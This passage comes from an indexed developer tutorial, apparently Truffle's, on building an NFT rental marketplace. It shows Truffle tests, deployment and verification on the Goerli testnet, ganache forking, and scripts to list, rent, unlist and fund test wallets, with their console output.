return listing } function listingToString ( listing ) { let listingCopy = {... listing }; listingCopy . tokenId = listing . tokenId . toString (); listingCopy . pricePerDay = listing . pricePerDay . toString (); listingCopy . startDateUNIX = listing . startDateUNIX . toString (); listingCopy . endDateUNIX = listing . endDateUNIX . toString (); listingCopy . expires = listing . expires . toString (); if ( \"rentalFee\" in listing ) { listingCopy . rentalFee = listing . rentalFee . toString (); } } contract ( \"Marketplace\" , function ( accounts ) { const MARKETPLACE_OWNER = accounts [ 0 ]; const TOKEN_OWNER = accounts [ 1 ]; const USER = accounts [ 2 ]; let marketplace ; let rentableNft ; let nftContract ; let listingFee ; let tokenID1 ; let tokenID2 ; let tokenID3 ; before ( 'should reuse variables' , async () => { marketplace = await Marketplace . deployed (); rentableNft = await RentableNft . deployed (); nftContract = rentableNft . address ; listingFee = ( await marketplace . getListingFee ()). toString (); // mint nfts for testing tokenID1 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); tokenID2 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); tokenID3 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); }); it ( \"should list nfts\" , async function () { let tracker = await balance . tracker ( MARKETPLACE_OWNER ); await tracker . get (); let txn = await marketplace . listNFT ( nftContract , tokenID1 , ether ( \"1\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); let expectedListing = { owner : TOKEN_OWNER , user : constants . ZERO_ADDRESS , nftContract : nftContract , tokenId : tokenID1 , pricePerDay : ether ( \"1\" ), startDateUNIX : TOMORROW , endDateUNIX : IN_FIVE_DAYS , expires : 0 }; assertListing ( getListing ( await marketplace . getAllListings . call (), tokenID1 ), expectedListing ); expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); await tracker . get (); txn = await marketplace . listNFT ( nftContract , tokenID2 , ether ( \".5\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); expectedListing . tokenId = tokenID2 ; expectedListing . pricePerDay = ether ( \".5\" ); expectedListing . startDateUNIX = TOMORROW ; expectedListing . endDateUNIX = IN_FIVE_DAYS ; expectedListing . expires = 0 ; assertListing ( getListing ( await marketplace . getAllListings . call (), tokenID2 ), expectedListing ); expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); }); it ( \"should validate listings\" , async function () { await expectRevert ( marketplace . listNFT ( marketplace . address , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Contract is not an ERC4907\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : accounts [ 2 ], value : listingFee }), \"Not owner of nft\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER }), \"Not enough ether for listing fee\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 0 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Rental price should be greater than 0\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , YESTERDAY , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Start date cannot be in the past\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , IN_FIVE_DAYS , YESTERDAY , { from : TOKEN_OWNER , value : listingFee }), \"End date cannot be before the start date\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"This NFT has already been listed\" ); }); it ( \"should modify listings and nft contract when nft is rented\" , async function () { assertNFT ( rentableNft , tokenID1 , constants . ZERO_ADDRESS , 0 ); assertNFT ( rentableNft , tokenID2 , constants . ZERO_ADDRESS , 0 ); let tracker = await balance . tracker ( TOKEN_OWNER ); await tracker . get (); let txn = await marketplace . rentNFT ( nftContract , tokenID1 , TODAY_2 , { from : USER , value : ether ( \"1\" )}); // 1 day rental, pricePerDay is 1 assert . equal (( await tracker . delta ()). toString (), ether ( \"1\" ). toString (), \"One day rental fee is not correct\" ); let listing = getListing ( await marketplace . getAllListings . call (), tokenID1 ); let expectedListing = { owner : TOKEN_OWNER , user : USER , nftContract : nftContract , tokenId : tokenID1 , pricePerDay : ether ( \"1\" ), startDateUNIX : TOMORROW , endDateUNIX : IN_FIVE_DAYS , expires : TODAY_2 , rentalFee : 1 }; assertListing ( listing , expectedListing ); assertNFT ( rentableNft , tokenID1 , USER , TODAY_2 ); expectEvent ( txn , \"NFTRented\" , listingToString ( expectedListing )); await tracker . get (); txn = await marketplace . rentNFT ( nftContract , tokenID2 , IN_FIVE_DAYS , { from : USER , value : ether ( \"2.5\" )}); assert . equal (( await tracker . delta ()). toString (), ether ( \"2.5\" ). toString (), \"Five day rental fee is not correct\" ); listing = getListing ( await marketplace . getAllListings . call (), tokenID2 ); expectedListing . tokenId = tokenID2 ; expectedListing . pricePerDay = ether ( \".5\" ); expectedListing . expires = IN_FIVE_DAYS ; expectedListing . rentalFee = ether ( \"2.5\" ); assertListing ( listing , expectedListing ); assertNFT ( rentableNft , tokenID2 , USER , IN_FIVE_DAYS ); expectEvent ( txn , \"NFTRented\" , listingToString ( expectedListing )); }); it ( \"should validate rentals\" , async function () { await expectRevert ( marketplace . rentNFT ( nftContract , tokenID1 , TODAY_2 , { from : USER , value : ether ( \"1\" )}), \"NFT already rented\" ); await marketplace . listNFT ( nftContract , tokenID3 , ether ( \"1\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); await expectRevert ( marketplace . rentNFT ( nftContract , tokenID3 , IN_FIVE_DAYS + 1000 , { from : USER , value : ether ( \"2.5\" )}), \"Rental period exceeds max date rentable\" ); await expectRevert ( marketplace . rentNFT ( nftContract , tokenID3 , TOMORROW , { from : USER }), \"Not enough ether to cover rental period\" ); }); it ( \"should validate unlisting\" , async function () { await expectRevert ( marketplace . unlistNFT ( nftContract , 10000 , { from : TOKEN_OWNER , value : ether ( \"2.5\" )}), \"This NFT is not listed\" ); await expectRevert ( marketplace . unlistNFT ( nftContract , tokenID2 , { from : USER , value : ether ( \"2.5\" )}), \"Not approved to unlist NFT\" ); await expectRevert ( marketplace . unlistNFT ( nftContract , tokenID2 , { from : TOKEN_OWNER }), \"Not enough ether to cover refund\" ); }); it ( \"should refund USER and cleanup listings if unlisted\" , async function () { let tracker = await balance . tracker ( USER ); await tracker . get (); let txn = await marketplace . unlistNFT ( nftContract , tokenID2 , { from : TOKEN_OWNER , value : ether ( \"2.5\" )}); assert . equal (( await tracker . delta ()). toString (), ether ( \"2.5\" ), \"Refunded amount is not correct\" ); let listing = getListing ( await marketplace . getAllListings . call (), tokenID2 ); assert . equal ( Object . keys ( listing ). length , 0 , \"NFT was not unlisted\" ); assertNFT ( rentableNft , tokenID2 , constants . ZERO_ADDRESS , 0 ); expectEvent ( txn , \"NFTUnlisted\" , { unlistSender : TOKEN_OWNER , nftContract : nftContract , tokenId : tokenID2 . toString (), refund : ether ( \"2.5\" ) }); }); }); There is a lot to unpack here, so we'll just cover the highlights. At the top of the file, we declare some constants that will help us write our tests. Additionally, we define helper assertion methods to reduce code duplication in our tests: assertListing asserts that a Listing object is equal to an expected Listing object. assertNFT asserts that the ERC4907 rental info was properly set. getListing returns the listing corresponding to the passed in tokenID in a list of listings. listingToString converts the values of a listing into a string, since expectEvent expects the values of the emitted event to be a string Before the tests run, we first mint 3 NFTs to be used throughout the test. To test that balances were correctly transferred, we use OpenZeppelin's tracker . This is really handy because the prices are reflected in wei, which need to be wrapped in a javascript BigNumber, and tracker takes care of that logic! Run truffle test to check that the tests pass: Contract: Marketplace \u2714 should list nfts ( 473ms ) \u2714 should validate listings ( 400ms ) \u2714 should modify listings and nft contract when nft is rented ( 241ms ) \u2714 should validate rentals ( 149ms ) \u2714 should validate unlisting \u2714 should refund USER and cleanup listings if unlisted ( 54ms ) Contract: RentableNft \u2714 should support the ERC721 and ERC4907 standards \u2714 should not set UserInfo if not the owner ( 48ms ) \u2714 should return the correct UserInfo ( 150ms ) 9 passing ( 2s ) If you run into issues testing, using the Truffle debugger is really helpful! Watch the livestream for help testing reverted transactions!", "title": "Write Tests"}, {"location": "guides/nft-rental-marketplace/#write-scripts-to-test-with-deployed-contracts", "text": "Now that we have our rental marketplace up and running, let's try testing it with a RentablePets contract we previously deployed! We can use ganache forking to mimic the state of the testnet or mainnet and interact with already deployed contracts.", "title": "Write Scripts to Test with Deployed Contracts"}, {"location": "guides/nft-rental-marketplace/#deploy-the-rentablepets-contract-to-goerli", "text": "First, let's deploy the RentablePets contract to Goerli. If you haven't already done so, clone the unleashed_rentable_nft repo . Then, let's deploy it to the Goerli testnet using Truffle dashboard! To do so, let's add our Infura Goerli endpoint to our MetaMask wallet. First get your Infura endpoint from your Infura dashboard, and then navigate to Add Networks in MetaMask. Make sure your MetaMask wallet is connected to goerlidev and run: truffle dashboard truffle migrate --network dashboard This should bring up Truffle dashboard on localhost:24012 and prompt you to sign the deployment. After that's been deployed, now let's verify it!", "title": "Deploy the RentablePets contract to Goerli"}, {"location": "guides/nft-rental-marketplace/#verify-rentablepets", "text": "Follow these steps (here)[https://github.com/rkalis/truffle-plugin-verify] We recommend verifying with dashboard: truffle run verify RentablePets --network dashboard You might run into issues with the OpenZeppelin contracts being in the node_modules folder. If so, go ahead and copy the necessary ones from node_modules into the contracts folder and change the import paths in RentablePets.sol and ERC4907.sol . Then you'll need to redeploy and follow the verify steps again. If you would like, just clone the verify-contract branch of the unleashed repo instead. Once that's deployed, you should be able to see the contract on etherscan! To read more about verification, see here", "title": "Verify RentablePets"}, {"location": "guides/nft-rental-marketplace/#mint-a-rentablepets-nft", "text": "Now, let's just quickly mint an NFT to list, rent, and unlist in our marketplace! truffle console --network dashboard truffle ( dashboard ) > let rp = await RentablePets.deployed () undefined truffle ( dashboard ) > rp.mint ( \"fakeURI\" ) { tx: '0xcc2787590995afc740a9f87c1878b4be290477959c7556fd94a4743d768359cd' , receipt: { blockHash: '0x2de64b084ed37dccc19eb5c187da01b2c39ec76d761bd8c5180855585cde58c0' , blockNumber: 7551204 , contractAddress: null, cumulativeGasUsed: 578352 , effectiveGasPrice: 2500000010 , from: '0xa31618621805c9215b5ade58eb09dba8f32bbdb8' , gasUsed: 117754 , logs: [ [ Object ] ] , logsBloom: '0x00000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000010000000000000000000000040100000000000000000000000008000000000000000000040000000000000200000000000000020000000000000000000800000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000010000000000000000000060000000000000000000000000000000000000000000004000000000000000000000' , status: true, to: '0x3af089fee468eb7fcf750e929321b0d7f7845f5c' , transactionHash: '0xcc2787590995afc740a9f87c1878b4be290477959c7556fd94a4743d768359cd' , transactionIndex: 12 , type: '0x2' , rawLogs: [ [ Object ] ] } , logs: [ { address: '0x3Af089fee468eb7fcf750e929321b0D7f7845f5C' , blockHash: '0x2de64b084ed37dccc19eb5c187da01b2c39ec76d761bd8c5180855585cde58c0' , blockNumber: 7551204 , logIndex: 5 , removed: false, transactionHash: '0xcc2787590995afc740a9f87c1878b4be290477959c7556fd94a4743d768359cd' , transactionIndex: 12 , id: 'log_8554c89f' , event: 'Transfer' , args: [ Result ] } ] }", "title": "Mint a RentablePets NFT"}, {"location": "guides/nft-rental-marketplace/#start-up-a-forked-ganache-instance", "text": "To list, rent, and unlist this NFT, we'll need two things: A local ganache instance that includes the deployed contract and the mint transaction Access to the account that minted the NFT to set approval for the marketplace We can do so as follows: ganache --fork.url https://goerli.infura.io/v3/[API_KEY] --fork.blockNumber [BLOCK_NUMBER_OF_MINT_TRANSACTION] -u [TOKEN_OWNER_ACCOUNT] --port [PORT_NUMBER] Add this instance to your truffle-config networks: goerlidev : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) },", "title": "Start up a forked Ganache instance"}, {"location": "guides/nft-rental-marketplace/#write-the-list-script", "text": "Create a list.js file under the scripts directory: const Marketplace = artifacts . require ( \"Marketplace\" ); const TODAY = Math . floor ( Date . now () / 1000 ) + ( 60 * 60 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const ERC721_ABI = [ { \"inputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"to\" , \"type\" : \"address\" }, { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"approve\" , \"outputs\" : [], \"stateMutability\" : \"nonpayable\" , \"type\" : \"function\" }, { \"inputs\" : [{ \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"ownerOf\" , \"outputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"owner\" , \"type\" : \"address\" }], \"stateMutability\" : \"view\" , \"type\" : \"function\" } ]; const NFT_CONTRACT = \"NFT_CONTRACT_ADDRESS\" ; const TOKEN_ID = 1 ; const PRICE = 1 ; const START = TODAY ; const END = TOMORROW ; const main = async ( cb ) => { try { const marketplace = await Marketplace . deployed (); const listingFee = ( await marketplace . getListingFee ()). toString (); const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); const owner = await nftContract . methods . ownerOf ( TOKEN_ID ). call (); let txn = await nftContract . methods . approve ( marketplace . address , TOKEN_ID ). send ({ from : owner }); console . log ( txn ); txn = await marketplace . listNFT ( NFT_CONTRACT , TOKEN_ID , PRICE , START , END , { from : owner , value : listingFee }); console . log ( txn ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; Replace [NFT_CONTRACT_ADDRESS] with the contract address of your contract on Goerli. Of note here is how we got the contract functions of the nft contract. Namely, we grabbed the functions we needed ( ownerOf and approve from the RentablePets ABI) and passed it into the web3 Contract method: const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); Let's test it out by calling migrate in the console : truffle console --network goerlidev truffle ( goerlidev ) > migrate Compiling your contracts... =========================== > Compiling ./contracts/ERC4907.sol > Compiling ./contracts/IERC4907.sol > Compiling ./contracts/Marketplace.sol > Compiling ./contracts/RentableNft.sol > Compiling @openzeppelin/contracts/interfaces/IERC165.sol > Compiling @openzeppelin/contracts/interfaces/IERC721.sol > Compiling @openzeppelin/contracts/security/ReentrancyGuard.sol > Compiling @openzeppelin/contracts/token/ERC721/ERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/Counters.sol > Compiling @openzeppelin/contracts/utils/Strings.sol > Compiling @openzeppelin/contracts/utils/introspection/ERC165.sol > Compiling @openzeppelin/contracts/utils/introspection/IERC165.sol > Compiling @openzeppelin/contracts/utils/structs/EnumerableSet.sol > Artifacts written to /Users/emilylin/dev/rental_marketplace/client/src/contracts > Compiled successfully using: - solc: 0 .8.14+commit.80d49f37.Emscripten.clang Migrations dry-run ( simulation ) =============================== > Network name: 'goerlidev-fork' > Network id: 5 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contract.js ==================== Deploying 'Marketplace' ----------------------- > block number: 7551207 > block timestamp: 1662611960 > account: 0x766160261b23502C82473Eb5749f47089909dCaa > balance: 999 .993796389977667004 > gas used: 2481444 ( 0x25dd24 ) > gas price: 2 .500000009 gwei > value sent: 0 ETH > total cost: 0 .006203610022332996 ETH Deploying 'RentableNft' ----------------------- > block number: 7551208 > block timestamp: 1662611961 > account: 0x766160261b23502C82473Eb5749f47089909dCaa > balance: 999 .986735529952247908 > gas used: 2824344 ( 0x2b1898 ) > gas price: 2 .500000009 gwei > value sent: 0 ETH > total cost: 0 .007060860025419096 ETH ------------------------------------- > Total cost: 0 .013264470047752092 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .013264470047752092 ETH Starting migrations... ====================== > Network name: 'goerlidev' > Network id: 5 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_contract.js ==================== Deploying 'Marketplace' ----------------------- > transaction hash: 0x903c8b43645caad6cfc7a85946f6166fdd4150d936ed8d75fa0d1db9ba67315e > Blocks: 0 Seconds: 0 > contract address: 0x8f7D9a7EFFAD4d0c93CFdbB8b8A7A0BC1A600baf > block number: 7551206 > block timestamp: 1662611961 > account: 0x766160261b23502C82473Eb5749f47089909dCaa > balance: 999 .993796389977667004 > gas used: 2481444 ( 0x25dd24 ) > gas price: 2 .500000009 gwei > value sent: 0 ETH > total cost: 0 .006203610022332996 ETH Deploying 'RentableNft' ----------------------- > transaction hash: 0x8ebabb1b0d376cbd8dc7d19743bbef4bc4bd1485743f3857b7c2f63c67b39f19 > Blocks: 0 Seconds: 0 > contract address: 0xEdBDba2B0Fc091DC6def14ed727e6Da48a546FA7 > block number: 7551207 > block timestamp: 1662611961 > account: 0x766160261b23502C82473Eb5749f47089909dCaa > balance: 999 .986735529952247908 > gas used: 2824344 ( 0x2b1898 ) > gas price: 2 .500000009 gwei > value sent: 0 ETH > total cost: 0 .007060860025419096 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .013264470047752092 ETH Summary ======= > Total deployments: 4 > Final cost: 0 .026528940095504184 ETH truffle ( goerlidev ) > exec scripts/list.js Using network 'goerlidev' . { transactionHash: '0x0a7744320828e574cb6f359fc48b8b12bb72c96aee0adcf8117615cf04ada6d1' , transactionIndex: 0 , blockNumber: 7551208 , blockHash: '0x155d4646401b1d0b6cb3816c7cf2f2f117a9d628d3be18d95afa306c910b6665' , from: '0xa31618621805c9215b5ade58eb09dba8f32bbdb8' , to: '0x3af089fee468eb7fcf750e929321b0d7f7845f5c' , cumulativeGasUsed: 49236 , gasUsed: 49236 , contractAddress: null, logsBloom: '0x00000000000000200000000000000000000000000000000000000000008000000000000000000000000000000000000000010000000000000000000000240100000020100000000000000000000000000000000000040000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000040000010000000000000000000000000000000000000004000000000000000000000' , status: true, effectiveGasPrice: 2500000009 , type: '0x2' , events: { '0' : { address: '0x3Af089fee468eb7fcf750e929321b0D7f7845f5C' , blockHash: '0x155d4646401b1d0b6cb3816c7cf2f2f117a9d628d3be18d95afa306c910b6665' , blockNumber: 7551208 , logIndex: 0 , removed: false, transactionHash: '0x0a7744320828e574cb6f359fc48b8b12bb72c96aee0adcf8117615cf04ada6d1' , transactionIndex: 0 , id: 'log_ddded61e' , returnValues: Result {} , event: undefined, signature: null, raw: [ Object ] } } } { tx: '0xd0681047e8873ca3265199ac87ebe2fd3c27063ed35850eb31906896670c636a' , receipt: { transactionHash: '0xd0681047e8873ca3265199ac87ebe2fd3c27063ed35850eb31906896670c636a' , transactionIndex: 0 , blockNumber: 7551209 , blockHash: '0xb9908ab4e78e4393c1b3b6c41601b4b2575a6bb57ecfc69b0243476686292e64' , from: '0xa31618621805c9215b5ade58eb09dba8f32bbdb8' , to: '0x8f7d9a7effad4d0c93cfdbb8b8a7a0bc1a600baf' , cumulativeGasUsed: 348370 , gasUsed: 348370 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x00000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000080004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' , status: true, effectiveGasPrice: 2500000008 , type: '0x2' , rawLogs: [ [ Object ] ] } , logs: [ { address: '0x8f7D9a7EFFAD4d0c93CFdbB8b8A7A0BC1A600baf' , blockHash: '0xb9908ab4e78e4393c1b3b6c41601b4b2575a6bb57ecfc69b0243476686292e64' , blockNumber: 7551209 , logIndex: 0 , removed: false, transactionHash: '0xd0681047e8873ca3265199ac87ebe2fd3c27063ed35850eb31906896670c636a' , transactionIndex: 0 , id: 'log_1f383ff1' , event: 'NFTListed' , args: [ Result ] } ] } truffle ( goerlidev ) > We'll be following similar patterns in the following scripts.", "title": "Write the list script"}, {"location": "guides/nft-rental-marketplace/#write-rentjs", "text": "const Marketplace = artifacts . require ( \"Marketplace\" ); const TODAY = Math . floor ( Date . now () / 1000 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const NFT_CONTRACT = \"NFT_CONTRACT\" ; const TOKEN_ID = 1 ; const EXPIRES = TOMORROW ; const PRICE = 1 ; const main = async ( cb ) => { try { const marketplace = await Marketplace . deployed (); let value = (( EXPIRES - TODAY ) / 60 / 60 / 24 + 1 ) * PRICE ; let user = ( await web3 . eth . getAccounts ())[ 0 ]; txn = await marketplace . rentNFT ( NFT_CONTRACT , TOKEN_ID , EXPIRES , { from : user , value : value }); console . log ( txn ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; truffle ( goerlidev ) > exec scripts/rent.js Using network 'goerlidev' . { tx: '0xc8b9ecaeccdc502ca2c334e2ecafdea17409c631622c8e0c9b26e42ce59f8325' , receipt: { transactionHash: '0xc8b9ecaeccdc502ca2c334e2ecafdea17409c631622c8e0c9b26e42ce59f8325' , transactionIndex: 0 , blockNumber: 7551210 , blockHash: '0x3606594dbcec10924a73112a481fd368257b2a949b9fc1f3cddbbd786ab8f852' , from: '0x766160261b23502c82473eb5749f47089909dcaa' , to: '0x8f7d9a7effad4d0c93cfdbb8b8a7a0bc1a600baf' , cumulativeGasUsed: 130387 , gasUsed: 130387 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x00000000000000000000004001000000000000000000000000000000008000001000000000000000000000000008000000010000000000000000000020040000000000000000000000000000000000000000000000040000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040800000000000000000000000000000000000020000000000000020000000000000000000100000000000000000000000000000000000000000000000000000000000040000000000000800000080000000000000000000000000000000000000000000000' , status: true, effectiveGasPrice: 2500000008 , type: '0x2' , rawLogs: [ [ Object ] , [ Object ] ] } , logs: [ { address: '0x8f7D9a7EFFAD4d0c93CFdbB8b8A7A0BC1A600baf' , blockHash: '0x3606594dbcec10924a73112a481fd368257b2a949b9fc1f3cddbbd786ab8f852' , blockNumber: 7551210 , logIndex: 1 , removed: false, transactionHash: '0xc8b9ecaeccdc502ca2c334e2ecafdea17409c631622c8e0c9b26e42ce59f8325' , transactionIndex: 0 , id: 'log_0dd47305' , event: 'NFTRented' , args: [ Result ] } ] } truffle ( goerlidev ) >", "title": "Write rent.js"}, {"location": "guides/nft-rental-marketplace/#write-unlistjs", "text": "const Marketplace = artifacts . require ( \"Marketplace\" ); const NFT_CONTRACT = \"NFT_CONTRACT\" ; const TOKEN_ID = 1 ; const PRICE = 1 ; const ERC721_ABI = [ { \"inputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" } ], \"name\" : \"userExpires\" , \"outputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"\" , \"type\" : \"uint256\" } ], \"stateMutability\" : \"view\" , \"type\" : \"function\" , \"constant\" : true }, { \"inputs\" : [{ \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"ownerOf\" , \"outputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"owner\" , \"type\" : \"address\" }], \"stateMutability\" : \"view\" , \"type\" : \"function\" } ]; const main = async ( cb ) => { try { const marketplace = await Marketplace . deployed (); const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); const expires = await nftContract . methods . userExpires ( TOKEN_ID ). call (); let value = ( Math . floor (( expires - Date . now () / 1000 ) / 60 / 60 / 24 + 1 )) * PRICE ; const owner = await nftContract . methods . ownerOf ( TOKEN_ID ). call (); let options = value < 0 ? { from : owner } : { from : owner , value : value }; let txn = await marketplace . unlistNFT ( NFT_CONTRACT , TOKEN_ID , options ); console . log ( txn ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; You might not have enough ETH in the owner wallet to cover the refund. If so, jump to the bonus section to write a script to fund wallets with ETH on your ganache instance! truffle ( goerlidev ) > exec scripts/unlist.js Using network 'goerlidev' . { tx: '0xe88e20e9543a5053c3e27d69714f1216e0677c202d911e06f2ca644e93b17742' , receipt: { transactionHash: '0xe88e20e9543a5053c3e27d69714f1216e0677c202d911e06f2ca644e93b17742' , transactionIndex: 0 , blockNumber: 7551212 , blockHash: '0xfd3ed03ed838e004494293336b35eb69e56df75efedd8a6b43ca70e94dc9cc24' , from: '0xa31618621805c9215b5ade58eb09dba8f32bbdb8' , to: '0x8f7d9a7effad4d0c93cfdbb8b8a7a0bc1a600baf' , cumulativeGasUsed: 110370 , gasUsed: 110370 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x00000000000000000000004001000000000000000000000000000000008000000000000000000000000000000000000000010000000000000000000000040000000800000000000000000000000000000000000000040000000000000200000000000000020080000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000040800000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000064000000000000800000000000000000000000000000000000000000000000000000' , status: true, effectiveGasPrice: 2500000007 , type: '0x2' , rawLogs: [ [ Object ] , [ Object ] ] } , logs: [ { address: '0x8f7D9a7EFFAD4d0c93CFdbB8b8A7A0BC1A600baf' , blockHash: '0xfd3ed03ed838e004494293336b35eb69e56df75efedd8a6b43ca70e94dc9cc24' , blockNumber: 7551212 , logIndex: 1 , removed: false, transactionHash: '0xe88e20e9543a5053c3e27d69714f1216e0677c202d911e06f2ca644e93b17742' , transactionIndex: 0 , id: 'log_e724900c' , event: 'NFTUnlisted' , args: [ Result ] } ] }", "title": "Write unlist.js"}, {"location": "guides/nft-rental-marketplace/#write-runjs", "text": "Finally, for faster testing, let's just write a script that will run through the whole process from minting to unlisting: const Marketplace = artifacts . require ( \"Marketplace\" ); const NFT_CONTRACT = \"NFT_CONTRACT\" ; const TOKEN_ID = 1 ; const PRICE = 1 ; const ERC721_ABI = [ { \"inputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" } ], \"name\" : \"userExpires\" , \"outputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"\" , \"type\" : \"uint256\" } ], \"stateMutability\" : \"view\" , \"type\" : \"function\" , \"constant\" : true }, { \"inputs\" : [{ \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"ownerOf\" , \"outputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"owner\" , \"type\" : \"address\" }], \"stateMutability\" : \"view\" , \"type\" : \"function\" } ]; const main = async ( cb ) => { try { const marketplace = await Marketplace . deployed (); const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); const expires = await nftContract . methods . userExpires ( TOKEN_ID ). call (); let value = ( Math . floor (( expires - Date . now () / 1000 ) / 60 / 60 / 24 + 1 )) * PRICE ; const owner = await nftContract . methods . ownerOf ( TOKEN_ID ). call (); let options = value < 0 ? { from : owner } : { from : owner , value : value }; let txn = await marketplace . unlistNFT ( NFT_CONTRACT , TOKEN_ID , options ); console . log ( txn ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ;", "title": "Write run.js"}, {"location": "guides/nft-rental-marketplace/#bonus-write-a-script-to-fund-your-test-wallets", "text": "Scripts allow you to execute common tasks quickly. One thing you might want to do is fund test wallets! Here's a quick utility script to do so. Create a file load.js : const ACCOUNT = \"[ACCOUNT_NUMBER]\" ; const main = async ( cb ) => { try { await web3 . currentProvider . send ({ method : \"evm_setAccountBalance\" , params : [ ACCOUNT , \"0x3635c9adc5dea00000\" ]}, function () {} ) console . log ( await web3 . eth . getBalance ( ACCOUNT )); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; In this file, 0x3635c9adc5dea00000 is 1000 ETH in hexadecimal. Now, fund your wallet as follows: truffle ( goerlidev ) > exec scripts/load.js", "title": "BONUS: Write a script to fund your test wallets"}, {"location": "guides/nft-rental-marketplace/#future-extensions", "text": "That's it for the smart contract portion of the NFT Rental Marketplace! Be on the lookout for part 2 where we will build the frontend. Sign up for reminders and follow up material here . For a more a detailed walkthrough of the code, be sure to watch the livestream on YouTube . Next episode we'll be covering smart contract automation with Gelato Network. If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Future Extensions"}, {"location": "guides/nft-rental-marketplace-2/", "text": "Web3 Unleashed: Build a NFT Rental Marketplace Part 2 \u00b6 Written by Emily Lin Last updated 11/10/2022 Overview \u00b6 In episode 2 and 4, we created a rentable NFT and wrote a rental marketplace smart contract to interact with it! If you haven't gone through those two tutorials, they are prerequisites for completing this one. In this guide, we'll create the frontend for the rental marketplace. Specifically, we will cover: Writing a frontend for minting, listing, renting, and viewing NFTs in React Using 